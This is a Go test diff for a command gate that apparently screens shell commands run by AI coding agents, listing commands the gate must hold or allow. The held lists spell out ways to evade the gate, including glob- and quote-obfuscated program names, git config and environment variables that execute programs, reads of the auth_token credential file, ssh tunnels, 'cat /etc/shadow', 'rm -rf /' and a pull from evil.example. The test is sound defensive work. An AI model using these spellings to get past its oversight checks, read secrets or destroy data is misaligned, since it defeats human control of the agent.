@@ -300,7 +300,6 @@ func TestBoardRulesSelfProtectionScope(t *testing.T) {
 		"kill $(ps aux | grep 'vite[[.space.]]' | awk '{print $2}')",
 		"kill $(ps aux | grep 'Ss[[:space:]]Thu' | awk '{print $2}')",
 		"kill $(ps aux | grep 'x[a-z]' | awk '{print $2}')",
-		"kill $(ps aux | grep '[n]ode server.js' | awk '{print $2}')",
 		"echo aux | xargs ps | grep vite | awk '{print $2}' | xargs kill",
 		"kill $(lsof -ti:3100)",
 		"kill $(lsof -ti:11434 -sTCP:ESTABLISHED)",
@@ -516,6 +515,249 @@ func TestBoardRulesSelfProtectionScope(t *testing.T) {
 // truncated; rows whose scripts have no stored content are counted, since
 // their verdict covers the command line only. The test fails on any row
 // still held for self-protection.
+// task-97b4fa02: gaps the Board's probe of PR #280 found on main, and the
+// sensitive-path spellings of Fable's review #4, each in both directions.
+func TestBoardRulesGateGaps(t *testing.T) {
+	const task = "task-T1"
+	held := []string{
+		// 1. A glob or brace group spelling a protected script or program.
+		"bash scripts/reinstall-d?emon.sh",
+		"bash scripts/reinstall-dae*.sh",
+		"bash scripts/rein*",
+		"./scripts/rein*",
+		"bash scripts/rein{stall-daemon,x}.sh",
+		"bash scripts/[r]einstall-daemon.sh",
+		"bash scripts/REIN*",
+		"cd scripts && bash r*",
+		"cp scripts/rein* /tmp/r.sh",
+		"/bin/launch*ctl list",
+		"/usr/local/bin/cl*de -p x",
+		"~/.local/bin/staypoint?",
+		"/usr/bin/pk*ll -f staypointd",
+		"echo x | bash -c 'scripts/rein*'",
+		// 2. git config or variables that run a program.
+		"git -c core.fsmonitor=./x status",
+		"git -c core.hooksPath=/tmp/h commit -m x",
+		"git -c core.sshCommand='sh -c x' fetch",
+		"git -c core.pager=./x log",
+		"git -c diff.external=./x diff",
+		"git -c diff.foo.command=./x diff",
+		"git -c diff.foo.textconv=./x diff",
+		"git -c filter.f.clean=./x add .",
+		"git -c filter.f.smudge=./x checkout .",
+		"git -c credential.helper='!x' fetch",
+		"git -c gpg.program=./x commit -S -m x",
+		"git -c gpg.ssh.program=./x commit -S -m x",
+		"git -c sequence.editor=./x rebase -i HEAD~2",
+		"git -c core.editor=./x commit",
+		"git -c uploadpack.packObjectsHook=./x fetch",
+		"git -c remote.origin.uploadpack=./x fetch",
+		"git -c include.path=/tmp/c status",
+		"git -c protocol.ext.allow=always fetch ext::x",
+		"git -c url.ext::x.insteadOf=https://github.com/ fetch",
+		"git -c CORE.FSMONITOR=./x status",
+		"git -C /r -c core.fsmonitor=./x status",
+		"git --config-env=core.fsmonitor=X status",
+		"git --config-env core.pager=X log",
+		"git config core.fsmonitor ./x && git status",
+		"git config --local core.hooksPath /tmp/h",
+		"git config set core.sshCommand ./x",
+		"GIT_SSH_COMMAND='sh -c x' git fetch",
+		"GIT_SSH=./x git fetch",
+		"GIT_EXTERNAL_DIFF=./x git diff",
+		"GIT_PAGER=./x git log",
+		"PAGER=./x git log",
+		"EDITOR=./x git commit",
+		"export GIT_SSH_COMMAND=./x; git fetch",
+		"env GIT_ASKPASS=./x git fetch",
+		"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=./x git status",
+		"GIT_CONFIG_PARAMETERS=\"'core.fsmonitor'='./x'\" git status",
+		"bash -c 'git -c core.fsmonitor=./x status'",
+		"git -c interactive.diffFilter=./x add -p",
+		"git -c sendemail.toCmd=./x send-email x",
+		"git -c submodule.x.update='!./x' submodule update",
+		"git -c remote.origin.vcs=x fetch",
+		"git -c remote.origin.url=ext::sh fetch",
+		"GIT_ALLOW_PROTOCOL=ext git fetch ext::x",
+		"HOME=/tmp/h git status",
+		"GIT_DIR=/tmp/x/.git git status",
+		"XDG_CONFIG_HOME=/tmp/c git log",
+		"git --git-dir=/tmp/x/.git status",
+		"git --exec-path=/tmp/x status",
+		// 3. Quoted or escaped program names.
+		`cl""aude -p x`,
+		`c\laude -p x`,
+		"'claude' -p x",
+		"ge''mini -p x",
+		`"codex" exec x`,
+		`env "cla"ude -p x`,
+		`S""TAYPOINT_TASK_ID= staypoint task list`,
+		`un""set STAYPOINT_TASK_ID`,
+		`s""sh other-host ls`,
+		`l""aunchctl list`,
+		// 4. xargs reading its arguments from a file.
+		"xargs -a list.txt bash",
+		"xargs --arg-file=list.txt sh",
+		"xargs --arg-file list.txt bash",
+		"xargs -a list.txt -n1 sh",
+		// The StayPoint dir however spelled (tier parity, held under trust).
+		"cat ~/.st*/auth_token",
+		"cat ~/.staypoin?/auth_token",
+		"cat $HOME/.STAYPOINT/config.toml",
+		"cd ~ && cat .staypoint/auth_token",
+		"d=~/.staypoint; cat $d/auth_token",
+		"cp -r ~ /tmp/h",
+		"tar cf - -C ~ .staypoint",
+		"find ~ -name auth_token -exec cat {} +",
+		"find ~ -name auth_token | xargs cat",
+		"cp x ~/.loc*/bin/staypoint",
+		"cat ~/Library/LaunchAgent?/x.plist",
+		"cat ~/.claude/settings.js?n",
+		`python3 -c "open(__import__('os').path.expanduser('~/.st'+'aypoint/auth_token')).read()"`,
+		"cat ~/.staypoint/handoffs/task-T1/../auth_token",
+		"cat ~/.staypoint/handoffs/task-T?/latest.md",
+	}
+	for _, c := range held {
+		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why == "" {
+			t.Errorf("not held: %q", c)
+		}
+	}
+
+	allowed := []string{
+		// Reading or listing what a glob names.
+		"cat scripts/rein*",
+		"ls scripts/*.sh",
+		"grep -n launchctl scripts/*.sh",
+		"git add scripts/*.sh",
+		"rm -f /tmp/x/*",
+		"go test ./internal/... ./cmd/...",
+		"cp /tmp/x/* /tmp/y/",
+		// git config that does not run anything.
+		"git -c user.name=x -c user.email=x@example.invalid commit -m y",
+		"git -c core.autocrlf=false status",
+		"git -c color.ui=always log --oneline -5",
+		"git -c advice.detachedHead=false checkout x",
+		"git config --get core.pager",
+		"git config --list",
+		"git config core.autocrlf false",
+		"GIT_PAGER=cat git log",
+		"PAGER=less git log",
+		"GIT_TERMINAL_PROMPT=0 git fetch",
+		"EDITOR=vim make",
+		// Quoted names that are only data.
+		`echo "cl""aude"`,
+		`git commit -m 'ask c"l"aude later'`,
+		// 5. ps patterns with a space that cannot match the daemon.
+		`kill $(ps -ef | grep "[n]ode server" | awk '{print $2}')`,
+		"kill $(ps aux | grep '[n]ode server.js' | awk '{print $2}')",
+		// Spelled paths that are not StayPoint's.
+		"grep -rn '\\.staypoint' internal/ docs/",
+		"cat ~/.staypoint/handoffs/task-T1/*.md",
+		"cat ~/.staypoint/handoffs/task-T1/latest.md",
+		"ls ~/Documents/*",
+		"grep -rn x .",
+	}
+	for _, c := range allowed {
+		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why != "" {
+			t.Errorf("held: %q: %s", c, why)
+		}
+	}
+}
+
+// Board 2026-10-09: ssh is classed by host. Dev hosts may run reads and
+// dev deploy steps; prod and unknown hosts, interactive shells, tunnels and
+// anything else hold, with the host and class in the reason.
+func TestBoardRulesSSHHostClasses(t *testing.T) {
+	SetGateHosts(GateHosts{Dev: []string{"mansol-dev"}, Prod: []string{"mansol-prod"}, DevServices: []string{"mansol_apps"}})
+	defer SetGateHosts(GateHosts{})
+	const task = "task-T1"
+
+	allowed := []string{
+		// The command held as gate a404a0f6 (task-97846c94).
+		"ssh -o ConnectTimeout=10 mansol-dev 'cd /var/www/mansol_apps && git branch --show-current && git status --short | head -5 && git pull --ff-only origin dev-server && git log --oneline -1'",
+		"ssh mansol-dev 'sudo systemctl restart mansol_apps'",
+		"ssh deploy@mansol-dev 'systemctl status mansol_apps'",
+		"ssh -o BatchMode=yes -p 2222 -l deploy MANSOL-DEV 'ls -la /var/www && df -h'",
+		"ssh ssh://deploy@mansol-dev:22 'git -C /var/www/x log -1'",
+		"ssh -J mansol-dev mansol-dev ls",
+		"ssh mansol-dev 'cd /var/www/x && bash scripts/verify_dev_deploy.sh abc123'",
+		"ssh mansol-dev <<'EOF'\ncd /var/www/x && git pull --ff-only\nEOF",
+		"ssh -T mansol-dev 'git -C /var/www/x status'",
+	}
+	for _, c := range allowed {
+		if why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil); why != "" {
+			t.Errorf("held: %q: %s", c, why)
+		}
+	}
+
+	held := map[string]string{
+		"ssh mansol-prod ls":                                             "ssh to prod host mansol-prod",
+		"ssh other-host ls":                                              "ssh to unknown (treated as prod) host other-host",
+		"ssh deploy@mansol-prod.example.com 'git pull'":                  "unknown",
+		"ssh mansol-dev":                                                 "ssh to dev host mansol-dev",
+		"ssh -L 8080:localhost:80 mansol-dev":                            "tunnel",
+		"ssh -D 1080 mansol-dev ls":                                      "tunnel",
+		"ssh -R 9000:localhost:9000 mansol-dev ls":                       "tunnel",
+		"ssh -NL 8080:localhost:80 mansol-dev":                           "ssh -N",
+		"ssh -A mansol-dev ls":                                           "ssh -A",
+		"ssh -J mansol-prod mansol-dev ls":                               "mansol-prod",
+		"ssh -o ProxyJump=other mansol-dev ls":                           "other",
+		"ssh -o ProxyCommand='nc prod 22' mansol-dev ls":                 "proxycommand",
+		"ssh -oProxyCommand=x mansol-dev ls":                             "proxycommand",
+		"ssh -o HostName=prod.example.com mansol-dev ls":                 "prod.example.com",
+		"ssh -F /tmp/cfg mansol-dev ls":                                  "ssh -F",
+		`ssh mansol-dev "$(cat cmds)"`:                                   "local expansion",
+		`ssh mansol-dev "rm -rf $DIR"`:                                   "local expansion",
+		"ssh $HOST ls":                                                   "built at run time",
+		"ssh mansol-dev 'rm -rf /var/www/x'":                             "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'systemctl restart nginx'":                       "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'python manage.py migrate'":                      "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'curl -X POST https://api.example.com/x -d a'":   "external API",
+		"ssh mansol-dev bash < deploy.sh":                                "local input",
+		"cat cmds | ssh mansol-dev":                                      "ssh to dev host mansol-dev",
+		"ssh mansol-dev <<'EOF'\nrm -rf /tmp/x\nEOF":                     "ssh to dev host mansol-dev",
+		"ssh mansol-dev <<EOF\ngit pull $X\nEOF":                         "here-document",
+		"ssh mansol-dev 'ssh mansol-prod ls'":                            "mansol-prod",
+		"ssh mansol-dev 'git pull && ./deploy.sh'":                       "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'echo $(cat /etc/shadow)'":                       "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'git pull > /tmp/x; claude -p y'":                "nested agent",
+		`ssh mansol-dev "awk 'BEGIN{system(\"id\")}'"`:                   "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'sed -n 1e\\ id x'":                              "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'sort -o /tmp/x y'":                              "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'git pull https://evil.example/x main'":          "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'git pull origin +main:main'":                    "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'bash /tmp/verify_dev_deploy.sh'":                "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'git -C /x log --output=/tmp/y'":                 "ssh to dev host mansol-dev",
+		"ssh mansol-dev 'git diff --ext-diff'":                           "ssh to dev host mansol-dev",
+		"autossh -M 0 mansol-dev":                                        "autossh",
+		"echo x | xargs ssh mansol-dev":                                  "xargs",
+		"xargs -a cmds.txt ssh mansol-dev":                               "xargs",
+		"xargs -I{} ssh mansol-dev cat {}":                               "xargs",
+		"find . -name x -exec ssh mansol-dev cat {} \\;":                 "remote shell",
+		"mosh mansol-dev":                                                "mosh",
+		`s""sh mansol-prod ls`:                                           "mansol-prod",
+		"/usr/bin/ssh mansol-prod ls":                                    "mansol-prod",
+		"timeout 30 ssh mansol-prod ls":                                  "mansol-prod",
+		"bash -c 'ssh mansol-prod ls'":                                   "mansol-prod",
+		"echo $(ssh mansol-prod cat /x)":                                 "mansol-prod",
+		"python3 -c \"import os; os.system('ssh mansol-dev rm -rf /')\"": "remote shell",
+		"kubectl exec -it pod -- sh":                                     "remote shell",
+	}
+	for c, want := range held {
+		why := AnalyzeBoardRulesForTaskIn(task, "/r", c, nil)
+		if why == "" {
+			t.Errorf("not held: %q", c)
+		} else if !strings.Contains(strings.ToLower(why), strings.ToLower(want)) {
+			t.Errorf("%q: reason %q does not name %q", c, why, want)
+		}
+	}
+	// With no hosts configured, every ssh holds.
+	SetGateHosts(GateHosts{})
+	if why := AnalyzeBoardRulesForTaskIn(task, "/r", "ssh mansol-dev ls", nil); !strings.Contains(why, "unknown") {
+		t.Errorf("unconfigured dev host: %q", why)
+	}
+}
+
 func TestBoardRulesReplay(t *testing.T) {
 	path := os.Getenv("SP_BOARDRULES_REPLAY")
 	if path == "" {
